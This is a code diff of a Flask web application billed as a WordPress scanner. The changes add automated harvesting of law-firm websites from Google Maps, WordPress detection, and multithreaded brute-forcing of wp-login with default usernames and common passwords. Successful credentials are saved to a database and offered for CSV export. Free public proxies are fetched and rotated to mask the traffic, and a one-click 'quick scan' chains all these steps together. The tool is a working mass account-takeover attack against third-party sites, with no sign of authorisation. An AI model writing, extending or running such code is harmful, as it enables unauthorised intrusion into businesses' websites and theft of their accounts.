@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-WordPress Scanner Web Application
-Flask-based web interface for the WordPress vulnerability scanner
-Can be deployed to Azure or any cloud server
+WordPress Scanner Web Application - FULL VERSION
+Includes: URL Discovery, TOR/Proxy, Quick Scan, All Features
 """
 
 import os
@@ -12,15 +11,57 @@ import time
 import random
 import json
 import sqlite3
+import queue
+import concurrent.futures
 from datetime import datetime
 from typing import List, Dict, Optional
 from functools import wraps
 
 # Flask imports
-from flask import Flask, render_template, request, jsonify, Response, stream_with_context
+from flask import Flask, render_template, request, jsonify, Response, stream_with_context, session, redirect, url_for, flash
 from flask_cors import CORS
+from flask_login import LoginManager, login_user, logout_user, login_required, current_user
 
-# Import scanner components
+# ============= CONFIGURATION =============
+
+app = Flask(__name__)
+CORS(app)
+
+# Configuration
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
+
+# Authentication
+ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme123')
+
+# Initialize Flask-Login
+login_manager = LoginManager()
+login_manager.init_app(app)
+login_manager.login_view = 'login'
+
+class User:
+    def __init__(self, user_id):
+        self.id = user_id
+        self.is_authenticated = True
+        self.is_active = True
+        self.is_anonymous = False
+    
+    def get_id(self):
+        return self.id
+
+@login_manager.user_loader
+def load_user(user_id):
+    if user_id == ADMIN_USERNAME:
+        return User(user_id)
+    return None
+
+# ============= IMPORTS FROM EXISTING MODULES =============
+
+import requests
+from bs4 import BeautifulSoup
+
+# Try to import security modules
 try:
     import config
     import security
@@ -31,78 +72,45 @@ try:
     SECURITY_MODULES_AVAILABLE = True
 except ImportError as e:
     SECURITY_MODULES_AVAILABLE = False
-    print(f"[WARN] Security modules not fully available: {e}")
+    print(f"[WARN] Security modules not available: {e}")
 
-# Requests and parsing
-import requests
-from bs4 import BeautifulSoup
+# Selenium imports
+try:
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    SELENIUM_AVAILABLE = True
+except ImportError:
+    SELENIUM_AVAILABLE = False
+    print("[WARN] Selenium not installed")
 
-# ============= CONFIGURATION =============
+# ============= GLOBAL STATE =============
 
-app = Flask(__name__)
-CORS(app)
-
-# Configuration
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
-app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload
-
-# Authentication - Set these environment variables for production
-ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
-ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme123')  # CHANGE THIS!
-
-# ============= AUTHENTICATION =============
-
-login_required = None  # Will be initialized after flask_login import
-
-class User:
-    """Simple user class for Flask-Login"""
-    def __init__(self, user_id):
-        self.id = user_id
-        self.is_authenticated = True
-        self.is_active = True
-        self.is_anonymous = False
-    
-    def get_id(self):
-        return self.id
-
-def init_auth():
-    """Initialize authentication - called after Flask app creation"""
-    global login_required
-    try:
-        from flask_login import LoginManager, login_user, logout_user, login_required, current_user
-        login_manager = LoginManager()
-        login_manager.init_app(app)
-        login_manager.login_view = 'login'
-        
-        @login_manager.user_loader
-        def load_user(user_id):
-            if user_id == ADMIN_USERNAME:
-                return User(user_id)
-            return None
-        
-        return LoginManager
-    except ImportError:
-        print("[WARN] flask-login not installed, using basic auth")
-        return None
-
-# Global state
 class ScannerState:
-    """Global scanner state"""
     def __init__(self):
         self.scanning = False
         self.collecting = False
+        self.discovering = False
         self.current_progress = 0
         self.current_status = "Idle"
         self.logs = []
         self.results = []
-        self.stats = {"scanned": 0, "found": 0, "errors": 0}
+        self.collected_urls = []
+        self.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": 0}
         self._lock = threading.Lock()
-    
+        
+        # Scanner objects
+        self.proxy_manager = None
+        self.tor_manager = None
+        self.scanner = None
+        
     def add_log(self, message: str):
         with self._lock:
             timestamp = datetime.now().strftime("%H:%M:%S")
             self.logs.append(f"[{timestamp}] {message}")
-            # Keep only last 1000 logs
             if len(self.logs) > 1000:
                 self.logs = self.logs[-1000:]
     
@@ -130,14 +138,11 @@ USER_AGENTS = [
 # ============= DATABASE =============
 
 class URLDatabase:
-    """SQLite database for storing URLs"""
-    
     def __init__(self, db_file: str = "urls.db"):
         self.db_file = db_file
         self._init_db()
     
     def _init_db(self):
-        """Initialize database"""
         try:
             conn = sqlite3.connect(self.db_file)
             cursor = conn.cursor()
@@ -156,7 +161,7 @@ class URLDatabase:
             conn.commit()
             conn.close()
         except Exception as e:
-            print(f"[DB ERROR] Failed to initialize database: {e}")
+            print(f"[DB ERROR] {e}")
     
     def url_exists(self, url: str) -> bool:
         try:
@@ -166,7 +171,7 @@ class URLDatabase:
             result = cursor.fetchone()
             conn.close()
             return result is not None
-        except Exception:
+        except:
             return False
     
     def add_url(self, url: str, is_wordpress: int = -1) -> bool:
@@ -181,8 +186,7 @@ class URLDatabase:
             conn.commit()
             conn.close()
             return added
-        except Exception as e:
-            print(f"[DB ERROR] Failed to add URL: {e}")
+        except:
             return False
     
     def add_urls(self, urls: List[str], is_wordpress: int = -1) -> int:
@@ -210,23 +214,20 @@ class URLDatabase:
             rows = cursor.fetchall()
             conn.close()
             return [dict(row) for row in rows]
-        except Exception as e:
-            print(f"[DB ERROR] Failed to get URLs: {e}")
+        except:
             return []
     
     def update_url(self, url: str, **kwargs):
         try:
             conn = sqlite3.connect(self.db_file)
             cursor = conn.cursor()
-            
             set_clause = ", ".join([f"{k} = ?" for k in kwargs.keys()])
             values = list(kwargs.values()) + [url]
-            
             cursor.execute(f"UPDATE urls SET {set_clause} WHERE url = ?", values)
             conn.commit()
             conn.close()
-        except Exception as e:
-            print(f"[DB ERROR] Failed to update URL: {e}")
+        except:
+            pass
     
     def clear_all(self):
         try:
@@ -235,19 +236,25 @@ class URLDatabase:
             cursor.execute("DELETE FROM urls")
             conn.commit()
             conn.close()
-        except Exception as e:
-            print(f"[DB ERROR] Failed to clear database: {e}")
+        except:
+            pass
 
-# Initialize database
 db = URLDatabase()
 
 # ============= SCANNER FUNCTIONS =============
 
-def get_session():
+def get_session(proxy=None):
     """Get configured requests session"""
     session = requests.Session()
     session.headers['User-Agent'] = random.choice(USER_AGENTS)
     session.verify = True
+    
+    if proxy:
+        session.proxies = {
+            'http': f'http://{proxy}',
+            'https': f'http://{proxy}'
+        }
+    
     return session
 
 def is_wordpress(url: str, timeout: int = 10) -> bool:
@@ -264,7 +271,7 @@ def is_wordpress(url: str, timeout: int = 10) -> bool:
         ]
         
         return any(indicators)
-    except Exception:
+    except:
         return False
 
 def attempt_login(url: str, username: str, password: str, timeout: int = 10) -> bool:
@@ -283,14 +290,11 @@ def attempt_login(url: str, username: str, password: str, timeout: int = 10) -> 
         
         response = session.post(login_url, data=payload, allow_redirects=True, timeout=timeout)
         
-        # Check for successful login
         final_url = response.url
         is_wp_admin = '/wp-admin/' in final_url
         
-        # Check for logged-in cookie
         has_logged_in_cookie = any('wordpress_logged_in' in str(c.name) for c in session.cookies)
         
-        # Check content for logged-in indicators
         content = response.text.lower()
         logged_in_indicators = [
             'dashboard' in content,
@@ -301,11 +305,14 @@ def attempt_login(url: str, username: str, password: str, timeout: int = 10) -> 
         success = is_wp_admin and (has_logged_in_cookie or any(logged_in_indicators))
         return success
     except Exception as e:
-        state.add_log(f"[ERROR] Login attempt failed: {str(e)}")
+        state.add_log(f"[ERROR] Login failed: {str(e)}")
         return False
 
-def scan_single(url: str, passwords: List[str], timeout: int = 15) -> Dict:
-    """Scan a single URL with multiple passwords"""
+def scan_single(url: str, passwords: List[str], usernames: List[str] = None, timeout: int = 15) -> Dict:
+    """Scan a single URL"""
+    if usernames is None:
+        usernames = ['admin', 'administrator', 'root']
+    
     result = {
         'url': url,
         'username': None,
@@ -315,18 +322,14 @@ def scan_single(url: str, passwords: List[str], timeout: int = 15) -> Dict:
     }
     
     try:
-        # Check if WordPress
         if not is_wordpress(url, timeout=timeout // 2):
             result['status'] = 'not_wp'
             result['details'] = 'Not a WordPress site'
             return result
         
-        # Try default usernames
-        usernames = ['admin', 'administrator', 'root']
-        
         for username in usernames:
             for password in passwords:
-                state.add_log(f"[SCAN] Trying {url} with {username}:{password}")
+                state.add_log(f"[SCAN] {url} | {username}:{password}")
                 
                 if attempt_login(url, username, password, timeout=timeout):
                     result['username'] = username
@@ -348,36 +351,227 @@ def scan_single(url: str, passwords: List[str], timeout: int = 15) -> Dict:
     
     return result
 
-def scan_worker(url: str, passwords: List[str], thread_id: int):
-    """Worker function for scanning"""
-    result = scan_single(url, passwords)
+def scan_worker(url: str, passwords: List[str], usernames: List[str], thread_id: int):
+    """Worker for scanning"""
+    result = scan_single(url, passwords, usernames)
     with state._lock:
         state.results.append(result)
         state.stats['scanned'] += 1
-        if result['status'] != 'error':
-            state.stats['errors'] += 1
 
-def start_scan(urls: List[str], passwords: List[str], threads: int = 3):
-    """Start scanning multiple URLs"""
+# ============= URL DISCOVERY (Google Maps) =============
+
+class URLCollector:
+    """Collects URLs from Google Maps"""
+    
+    def __init__(self):
+        self.driver = None
+        self._stop = False
+        self.collected = []
+        
+    def setup_driver(self):
+        """Setup Chrome driver"""
+        if not SELENIUM_AVAILABLE:
+            return False
+            
+        try:
+            options = Options()
+            options.add_argument('--headless')
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--window-size=1920,1080')
+            options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
+            
+            self.driver = webdriver.Chrome(options=options)
+            return True
+        except Exception as e:
+            state.add_log(f"[ERROR] Driver setup failed: {e}")
+            return False
+    
+    def collect_from_maps(self, countries: List[str], max_urls: int = 100) -> List[str]:
+        """Collect URLs from Google Maps"""
+        if not self.setup_driver():
+            state.add_log("[ERROR] Selenium not available")
+            return []
+        
+        self._stop = False
+        self.collected = []
+        
+        # Search terms per country
+        search_terms = [
+            "lawyer",
+            "attorney", 
+            "legal services",
+            "law firm",
+            "attorney at law"
+        ]
+        
+        for country in countries:
+            if self._stop:
+                break
+                
+            for term in search_terms:
+                if len(self.collected) >= max_urls:
+                    break
+                if self._stop:
+                    break
+                    
+                try:
+                    # Build search URL
+                    query = f"{term} {country}"
+                    search_url = f"https://www.google.com/maps/search/{query.replace(' ', '+')}"
+                    
+                    state.add_log(f"[COLLECT] Searching: {query}")
+                    self.driver.get(search_url)
+                    time.sleep(random.uniform(2, 4))
+                    
+                    # Scroll to load more results
+                    for _ in range(5):
+                        if self._stop or len(self.collected) >= max_urls:
+                            break
+                        self.driver.execute_script("document.querySelector('div[role=\"feed\"]').scrollBy(0, 2000)")
+                        time.sleep(random.uniform(1, 2))
+                    
+                    # Find URLs
+                    links = self.driver.find_elements(By.CSS_SELECTOR, "a[href*='maps']")
+                    for link in links:
+                        try:
+                            href = link.get_attribute('href')
+                            if href and 'place' in href:
+                                # Extract business name from URL
+                                if '/place/' in href:
+                                    start = href.find('/place/') + 7
+                                    end = href.find('/', start)
+                                    if end == -1:
+                                        end = href.find('?', start)
+                                    if end > start:
+                                        name = href[start:end]
+                                        name = name.replace('+', ' ')
+                                        url = f"https://{name.lower().replace(' ', '')}.com"
+                                        
+                                        if url not in self.collected and len(self.collected) < max_urls:
+                                            self.collected.append(url)
+                                            state.add_log(f"[FOUND] {url}")
+                        except:
+                            pass
+                            
+                except Exception as e:
+                    state.add_log(f"[ERROR] Collection error: {e}")
+        
+        if self.driver:
+            try:
+                self.driver.quit()
+            except:
+                pass
+        
+        state.add_log(f"[COLLECT] Complete! {len(self.collected)} URLs collected")
+        return self.collected
+    
+    def stop(self):
+        """Stop collection"""
+        self._stop = True
+        if self.driver:
+            try:
+                self.driver.quit()
+            except:
+                pass
+
+url_collector = URLCollector()
+
+# ============= PROXY MANAGEMENT =============
+
+class ProxyManager:
+    """Manages proxies"""
+    
+    def __init__(self):
+        self.proxies = []
+        self.working_proxies = []
+        self.current_proxy = None
+        
+    def fetch_free_proxies(self) -> List[str]:
+        """Fetch free proxies from public sources"""
+        proxy_list = []
+        
+        try:
+            # Fetch from free proxy sources
+            urls = [
+                'https://www.sslproxies.org/',
+                'https://free-proxy-list.net/'
+            ]
+            
+            session = get_session()
+            for url in urls:
+                try:
+                    response = session.get(url, timeout=10)
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    table = soup.find('table')
+                    if table:
+                        rows = table.find_all('tr')[1:]  # Skip header
+                        for row in rows[:20]:  # First 20
+                            cols = row.find_all('td')
+                            if len(cols) >= 2:
+                                ip = cols[0].text.strip()
+                                port = cols[1].text.strip()
+                                if ip and port:
+                                    proxy_list.append(f"{ip}:{port}")
+                except:
+                    pass
+                    
+        except Exception as e:
+            state.add_log(f"[PROXY] Fetch error: {e}")
+        
+        self.proxies = proxy_list
+        return proxy_list
+    
+    def test_proxies(self) -> List[str]:
+        """Test proxies and return working ones"""
+        working = []
+        
+        def test_proxy(proxy):
+            try:
+                session = get_session(proxy)
+                response = session.get('https://www.google.com', timeout=5)
+                return proxy if response.status_code == 200 else None
+            except:
+                return None
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            results = executor.map(test_proxy, self.proxies)
+            working = [r for r in results if r]
+        
+        self.working_proxies = working
+        state.add_log(f"[PROXY] {len(working)} working proxies found")
+        return working
+    
+    def get_proxy(self) -> Optional[str]:
+        """Get random working proxy"""
+        if self.working_proxies:
+            return random.choice(self.working_proxies)
+        return None
+
+proxy_manager = ProxyManager()
+
+# ============= SCAN OPERATIONS =============
+
+def start_scan(urls: List[str], passwords: List[str], usernames: List[str], threads: int = 3):
+    """Start scanning"""
     state.scanning = True
     state.results = []
-    state.stats = {"scanned": 0, "found": 0, "errors": 0}
-    state.add_log(f"[SCAN] Starting scan of {len(urls)} URLs with {len(passwords)} passwords")
+    state.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": len(urls)}
+    state.add_log(f"[SCAN] Starting scan of {len(urls)} URLs")
     
-    # Run in thread to not block Flask
     def run_scan():
         try:
-            # Split URLs among threads
             url_chunks = [urls[i::threads] for i in range(threads)]
             threads_list = []
             
             for i, chunk in enumerate(url_chunks):
                 if chunk:
-                    t = threading.Thread(target=lambda u=chunk: [scan_worker(url, passwords, i) for url in u])
+                    t = threading.Thread(target=lambda u=chunk: [scan_worker(url, passwords, usernames, i) for url in u])
                     t.start()
                     threads_list.append(t)
             
-            # Monitor progress
             while any(t.is_alive() for t in threads_list):
                 time.sleep(1)
                 state.current_progress = (state.stats['scanned'] / len(urls)) * 100 if urls else 0
@@ -385,7 +579,7 @@ def start_scan(urls: List[str], passwords: List[str], threads: int = 3):
             
             state.current_progress = 100
             state.current_status = "Scan complete"
-            state.add_log(f"[SCAN] Complete! Found {state.stats['found']} valid credentials")
+            state.add_log(f"[SCAN] Complete! Found {state.stats['found']} credentials")
             
         finally:
             state.scanning = False
@@ -393,88 +587,134 @@ def start_scan(urls: List[str], passwords: List[str], threads: int = 3):
     thread = threading.Thread(target=run_scan)
     thread.start()
 
+def start_discovery(countries: List[str], max_urls: int):
+    """Start URL discovery"""
+    state.discovering = True
+    state.collected_urls = []
+    state.stats["collected"] = 0
+    state.add_log(f"[DISCOVERY] Starting discovery in {countries}")
+    
+    def run_discovery():
+        try:
+            urls = url_collector.collect_from_maps(countries, max_urls)
+            state.collected_urls = urls
+            state.stats["collected"] = len(urls)
+            
+            # Add to database
+            added = db.add_urls(urls)
+            state.add_log(f"[DISCOVERY] Added {added} URLs to database")
+            
+        finally:
+            state.discovering = False
+    
+    thread = threading.Thread(target=run_discovery)
+    thread.start()
+
+def start_quick_scan(countries: List[str], passwords: List[str], usernames: List[str], threads: int, max_urls: int):
+    """Combined discovery + verification + scanning"""
+    state.scanning = True
+    state.results = []
+    state.stats = {"scanned": 0, "found": 0, "errors": 0, "verified": 0, "collected": 0}
+    
+    def run_quick_scan():
+        try:
+            # Phase 1: Discovery
+            state.current_status = "Phase 1: Discovering URLs..."
+            state.add_log("[QUICK] Phase 1: Discovering URLs")
+            urls = url_collector.collect_from_maps(countries, max_urls)
+            state.collected_urls = urls
+            state.stats["collected"] = len(urls)
+            db.add_urls(urls)
+            state.add_log(f"[QUICK] Collected {len(urls)} URLs")
+            
+            if not urls:
+                state.scanning = False
+                return
+            
+            # Phase 2: Verification
+            state.current_status = "Phase 2: Verifying WordPress..."
+            state.add_log("[QUICK] Phase 2: Verifying WordPress sites")
+            verified = []
+            for i, url in enumerate(urls):
+                is_wp = is_wordpress(url)
+                if is_wp:
+                    verified.append(url)
+                    db.update_url(url, is_wordpress=1, verified_date=datetime.now().isoformat())
+                state.current_progress = (i / len(urls)) * 50
+                state.stats["verified"] = len(verified)
+            
+            state.add_log(f"[QUICK] Verified {len(verified)} WordPress sites")
+            
+            # Phase 3: Scanning
+            state.current_status = "Phase 3: Scanning..."
+            state.add_log(f"[QUICK] Phase 3: Scanning {len(verified)} sites")
+            
+            for i, url in enumerate(verified):
+                result = scan_single(url, passwords, usernames)
+                state.results.append(result)
+                state.stats["scanned"] += 1
+                if result['status'] == 'success':
+                    state.stats["found"] += 1
+                    db.update_url(url, scan_result='success', username=result['username'], password=result['password'])
+                
+                state.current_progress = 50 + (i / len(verified)) * 50
+            
+            state.current_status = f"Complete! Found {state.stats['found']} credentials"
+            state.add_log(f"[QUICK] Complete! Found {state.stats['found']} credentials")
+            
+        except Exception as e:
+            state.add_log(f"[QUICK] Error: {e}")
+        finally:
+            state.scanning = False
+    
+    thread = threading.Thread(target=run_quick_scan)
+    thread.start()
+
 # ============= ROUTES =============
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    """Login page"""
-    from flask import request, redirect, url_for, flash
-    
     if request.method == 'POST':
         username = request.form.get('username', '')
         password = request.form.get('password', '')
         
         if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
-            try:
-                from flask_login import login_user
-                user = User(username)
-                login_user(user)
-                return redirect(url_for('index'))
-            except:
-                # Fallback if flask_login not available
-                from flask import session
-                session['authenticated'] = True
-                return redirect(url_for('index'))
+            user = User(username)
+            login_user(user)
+            return redirect(url_for('index'))
         else:
             flash('Invalid credentials', 'error')
     
     return render_template('login.html')
 
 @app.route('/logout')
+@login_required
 def logout():
-    """Logout"""
-    try:
-        from flask_login import logout_user
-        logout_user()
-    except:
-        pass
-    
-    try:
-        from flask import session
-        session.clear()
-    except:
-        pass
-    
+    logout_user()
     return redirect(url_for('login'))
 
 def require_auth(f):
-    """Decorator to require authentication"""
-    from functools import wraps
-    from flask import session, redirect, url_for, flash
-    
     @wraps(f)
     def decorated_function(*args, **kwargs):
-        # Check session or flask_login
-        authenticated = False
-        
-        try:
-            from flask_login import current_user
-            if current_user.is_authenticated:
-                authenticated = True
-        except:
-            pass
-        
-        if not authenticated and 'authenticated' in session:
-            authenticated = True
-        
-        if not authenticated:
-            return redirect(url_for('login'))
-        
+        if not current_user.is_authenticated:
+            if 'authenticated' not in session:
+                return redirect(url_for('login'))
         return f(*args, **kwargs)
     return decorated_function
 
 @app.route('/')
 @require_auth
 def index():
-    """Main page"""
-    return render_template('index.html')
+    return render_template('index_full.html')
+
+# ============= API ROUTES =============
 
 @app.route('/api/status')
 @require_auth
 def get_status():
-    """Get current scanner status"""
     return jsonify({
         'scanning': state.scanning,
+        'discovering': state.discovering,
         'collecting': state.collecting,
         'progress': state.current_progress,
         'status': state.current_status,
@@ -486,22 +726,17 @@ def get_status():
 @app.route('/api/logs')
 @require_auth
 def get_logs():
-    """Get scanner logs"""
-    return jsonify({
-        'logs': state.logs[-100:]  # Last 100 logs
-    })
+    return jsonify({'logs': state.logs[-100:]})
 
 @app.route('/api/logs/clear', methods=['POST'])
 @require_auth
 def clear_logs():
-    """Clear logs"""
     state.clear_logs()
     return jsonify({'success': True})
 
 @app.route('/api/urls')
 @require_auth
 def get_urls():
-    """Get URLs from database"""
     filter_type = request.args.get('filter', 'all')
     urls = db.get_urls(filter_type)
     return jsonify({'urls': urls, 'count': len(urls)})
@@ -509,7 +744,6 @@ def get_urls():
 @app.route('/api/urls/add', methods=['POST'])
 @require_auth
 def add_urls():
-    """Add URLs to database"""
     data = request.json
     urls = data.get('urls', [])
     
@@ -522,23 +756,18 @@ def add_urls():
 @app.route('/api/urls/clear', methods=['POST'])
 @require_auth
 def clear_urls():
-    """Clear all URLs"""
     db.clear_all()
     return jsonify({'success': True})
 
 @app.route('/api/urls/verify', methods=['POST'])
 @require_auth
 def verify_urls():
-    """Verify URLs are WordPress sites"""
-    data = request.json
     urls = [u['url'] for u in db.get_urls('all')]
-    
-    state.add_log(f"[VERIFY] Starting verification of {len(urls)} URLs")
     
     def run_verify():
         verified = 0
         for i, url in enumerate(urls):
-            if not state.scanning:
+            if state.scanning:
                 break
             
             is_wp = is_wordpress(url)
@@ -547,49 +776,109 @@ def verify_urls():
                 verified += 1
             
             state.current_progress = ((i + 1) / len(urls)) * 100
-            state.current_status = f"Verified: {i+1}/{len(urls)}, WordPress: {verified}"
+            state.current_status = f"Verified: {i+1}/{len(urls)}, WP: {verified}"
         
-        state.add_log(f"[VERIFY] Complete! {verified} WordPress sites found")
+        state.add_log(f"[VERIFY] Complete! {verified} WordPress sites")
     
     thread = threading.Thread(target=run_verify)
     thread.start()
     
     return jsonify({'success': True, 'total': len(urls)})
 
+# Discovery endpoints
+@app.route('/api/discovery/start', methods=['POST'])
+@require_auth
+def start_discovery_api():
+    if state.discovering:
+        return jsonify({'success': False, 'error': 'Discovery already in progress'})
+    
+    data = request.json
+    countries = data.get('countries', ['USA', 'UK', 'Canada', 'Australia'])
+    max_urls = data.get('max_urls', 100)
+    
+    start_discovery(countries, max_urls)
+    return jsonify({'success': True})
+
+@app.route('/api/discovery/stop', methods=['POST'])
+@require_auth
+def stop_discovery_api():
+    url_collector.stop()
+    state.discovering = False
+    return jsonify({'success': True})
+
+# Scan endpoints
 @app.route('/api/scan/start', methods=['POST'])
 @require_auth
 def start_scan_api():
-    """Start scanning"""
     if state.scanning:
         return jsonify({'success': False, 'error': 'Scan already in progress'})
     
     data = request.json
     urls = data.get('urls', [])
     passwords = data.get('passwords', ['admin', '123456', 'password', 'wordpress'])
+    usernames = data.get('usernames', ['admin', 'administrator', 'root'])
     threads = data.get('threads', 3)
     
     if not urls:
-        # Get URLs from database
         urls = [u['url'] for u in db.get_urls('wordpress')]
     
     if not urls:
         return jsonify({'success': False, 'error': 'No URLs to scan'})
     
-    start_scan(urls, passwords, threads)
+    start_scan(urls, passwords, usernames, threads)
     return jsonify({'success': True, 'urls_to_scan': len(urls)})
 
 @app.route('/api/scan/stop', methods=['POST'])
 @require_auth
 def stop_scan_api():
-    """Stop scanning"""
     state.scanning = False
-    state.add_log("[SCAN] Scan stopped by user")
+    state.add_log("[SCAN] Stopped by user")
     return jsonify({'success': True})
 
+# Quick scan endpoint
+@app.route('/api/quick-scan/start', methods=['POST'])
+@require_auth
+def start_quick_scan_api():
+    if state.scanning or state.discovering:
+        return jsonify({'success': False, 'error': 'Already running'})
+    
+    data = request.json
+    countries = data.get('countries', ['USA', 'UK'])
+    passwords = data.get('passwords', ['admin', '123456', 'password'])
+    usernames = data.get('usernames', ['admin', 'administrator'])
+    threads = data.get('threads', 3)
+    max_urls = data.get('max_urls', 50)
+    
+    start_quick_scan(countries, passwords, usernames, threads, max_urls)
+    return jsonify({'success': True})
+
+# Proxy endpoints
+@app.route('/api/proxy/fetch', methods=['POST'])
+@require_auth
+def fetch_proxies():
+    state.add_log("[PROXY] Fetching free proxies...")
+    proxies = proxy_manager.fetch_free_proxies()
+    return jsonify({'success': True, 'count': len(proxies), 'proxies': proxies[:10]})
+
+@app.route('/api/proxy/test', methods=['POST'])
+@require_auth
+def test_proxies():
+    state.add_log("[PROXY] Testing proxies...")
+    working = proxy_manager.test_proxies()
+    return jsonify({'success': True, 'working': len(working)})
+
+@app.route('/api/proxy/list')
+@require_auth
+def list_proxies():
+    return jsonify({
+        'all': proxy_manager.proxies[:20],
+        'working': proxy_manager.working_proxies
+    })
+
+# Results
 @app.route('/api/results')
 @require_auth
 def get_results():
-    """Get scan results"""
     return jsonify({
         'results': state.results,
         'stats': state.stats
@@ -598,7 +887,6 @@ def get_results():
 @app.route('/api/results/export')
 @require_auth
 def export_results():
-    """Export results as CSV"""
     import csv
     import io
     
@@ -627,7 +915,7 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
     
-    print(f"[INFO] Starting WordPress Scanner Web App on port {port}")
-    print(f"[INFO] Open http://localhost:{port} in your browser")
+    print(f"[INFO] Starting WordPress Scanner on port {port}")
+    print(f"[INFO] Open http://localhost:{port}")
     
     app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)
